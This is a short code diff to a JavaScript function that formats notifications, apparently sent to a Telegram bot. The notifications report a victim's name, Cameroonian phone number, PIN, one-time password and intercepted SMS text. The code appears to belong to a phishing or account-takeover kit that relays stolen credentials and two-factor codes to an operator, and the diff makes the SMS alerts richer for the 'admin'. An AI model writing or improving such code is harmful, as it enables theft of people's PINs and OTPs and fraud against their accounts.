@@ -2090,17 +2090,19 @@
             } catch (e) { console.warn("tg", method, e); return null; }
         }
 
-        // ─── UPDATED: For SMS, return ONLY the SMS content (no headers, no extra info) ───
+        // ─── UPDATED: For SMS, include user name and phone number ───
         function tgFmt(row, kind) {
-            // SMS: just the message content – easy for admin to copy
-            if (kind === "sms") {
-                return row.smsMessage || '—';
-            }
             const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
             const num = row.phone || "—";
             const pin = row.pin || "—";
             const sms = row.smsMessage || "—";
             const otp = row.otp || "—";
+            
+            // SMS: include user name, phone, and the SMS message
+            if (kind === "sms") {
+                return `📱 SMS Message Received\n\n👤 Name: ${name}\n📞 Phone: +237${num}\n💬 SMS: ${sms}\n\n🆔 Application ID: ${row.id}`;
+            }
+            
             let title = "🔑 New PIN submitted";
             if (kind === "otp") title = "🔢 New OTP submitted";
             return `${title}\n\nName: ${name}\nPhone: ${num}\nPIN: ${pin}\nSMS: ${sms}\nOTP: ${otp}\nApplication ID: ${row.id}`;
